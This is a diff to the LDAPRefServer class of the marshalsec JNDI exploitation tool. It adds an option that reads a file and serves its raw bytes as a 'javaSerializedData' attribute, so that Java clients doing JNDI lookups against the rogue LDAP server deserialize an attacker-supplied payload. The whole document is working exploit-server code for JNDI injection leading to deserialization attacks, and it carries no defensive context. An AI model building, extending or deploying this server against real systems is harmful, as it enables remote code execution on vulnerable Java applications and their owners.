@@ -23,6 +23,9 @@ SOFTWARE.
 package marshalsec.jndi;
 
 
+import java.io.File;
+import java.io.FileInputStream;
+import java.io.FileNotFoundException;
 import java.net.InetAddress;
 import java.net.MalformedURLException;
 import java.net.URL;
@@ -52,6 +55,8 @@ public class LDAPRefServer {
 
     private static final String LDAP_BASE = "dc=example,dc=com";
 
+    private static String file;
+
 
     public static void main ( String[] args ) {
         int port = 1389;
@@ -62,6 +67,7 @@ public class LDAPRefServer {
         else if ( args.length > 1 ) {
             port = Integer.parseInt(args[ 1 ]);
         }
+        file = args[2];
 
         try {
             InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);
@@ -125,9 +131,20 @@ public class LDAPRefServer {
             if ( refPos > 0 ) {
                 cbstring = cbstring.substring(0, refPos);
             }
-            e.addAttribute("javaCodeBase", cbstring);
-            e.addAttribute("objectClass", "javaNamingReference"); //$NON-NLS-1$
-            e.addAttribute("javaFactory", this.codebase.getRef());
+            if (file == null) {
+                e.addAttribute("javaCodeBase", cbstring);
+                e.addAttribute("objectClass", "javaNamingReference"); //$NON-NLS-1$
+                e.addAttribute("javaFactory", this.codebase.getRef());
+            } else {
+                try {
+                    FileInputStream fileInputStream = new FileInputStream(new File(file));
+                    byte[] bytes = new byte[fileInputStream.available()];
+                    fileInputStream.read(bytes);
+                    e.addAttribute("javaSerializedData", bytes);
+                } catch (Exception ex) {
+                    ex.printStackTrace();
+                }
+            }
             result.sendSearchEntry(e);
             result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
         }
